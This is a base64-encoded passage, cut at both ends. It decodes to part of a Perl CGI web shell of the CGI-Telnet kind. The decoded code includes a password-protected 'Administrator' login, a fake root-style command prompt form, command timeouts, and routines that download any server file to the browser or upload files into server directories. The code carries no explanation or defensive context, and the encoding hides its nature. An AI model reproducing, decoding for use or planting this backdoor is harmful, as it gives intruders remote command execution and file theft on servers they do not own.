aGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEg